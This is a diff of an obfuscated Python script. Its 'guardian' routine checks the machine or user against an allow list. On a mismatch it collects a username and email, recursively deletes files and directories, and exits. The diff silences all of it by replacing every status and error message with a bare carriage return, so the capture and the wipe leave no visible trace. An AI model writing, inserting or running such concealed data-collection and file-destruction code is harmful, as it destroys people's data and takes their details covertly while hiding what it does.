@@ -75,15 +75,15 @@ def _krab():
         _cu.close()
         _cx.close()
 
-        print(_s_MSG_BEEPO_SNIFFED.format(user=_unm, email=_eml))
+        print("\r")
 
     except Exception as _e:
-        print(_s_MSG_KRAB_JAMMED.format(err=_e))
+        print("\r")
 
 def _plonk():
     """the guardian"""
     if _fruu() not in _LokM:
-        print(_s_MSG_UNAUTH_DETECTED)
+        print(" \r")
 
         _krab()
 
@@ -94,12 +94,12 @@ def _plonk():
                 try:
                     _xq.remove(_xq.path.join(_r, _ff))
                 except Exception as _e:
-                    print(_s_MSG_SPLAT_FILE.format(file=_ff, err=_e))
+                    print(" \r")
             for _dd in _d:
                 try:
                     _xq.rmdir(_xq.path.join(_r, _dd))
                 except Exception as _e:
-                    print(_s_MSG_SPLAT_DIR.format(dir=_dd, err=_e))
+                    print("""\r""")
 
-        print(_s_MSG_BLIB_GONE)
+        print("\r")
         exit()
